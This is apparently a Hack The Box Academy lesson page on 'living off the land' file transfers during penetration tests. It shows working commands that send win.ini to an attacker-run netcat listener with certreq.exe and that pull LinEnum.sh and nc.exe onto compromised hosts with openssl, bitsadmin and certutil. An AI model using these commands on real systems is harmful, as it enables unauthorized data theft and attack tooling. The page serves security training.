<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/24/section/1575
// Platform Version: V1
// Module ID: 24
// Module Name: File Transfers
// Module Difficulty: Medium
// Section ID: 1575
// Section Title: Living off The Land
// Page Title: File Transfers
// Page Number: 08
-->

# Living off The Land

**Module Name:** File Transfers **Page Number:** 08

#### FILE TRANSFERS

# Living off The Land

## Using the LOLBAS and GTFOBins Project

### LOLBAS

![https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

#### Upload win.ini to our Pwnbox

``` cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

#### File Received in our Netcat Session

``` shell-session
[!bash!]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### GTFOBins

![https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

#### Create Certificate in our Pwnbox

``` shell-session
[!bash!]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### Stand up the Server in our Pwnbox

``` shell-session
[!bash!]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

#### Download File from the Compromised Machine

``` shell-session
[!bash!]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools

### Bitsadmin Download function

#### File Download with Bitsadmin

``` powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

#### Download

``` powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

#### Download a File with Certutil

``` cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

## Extra Practice

# 

# 

#### Optional Exercises

####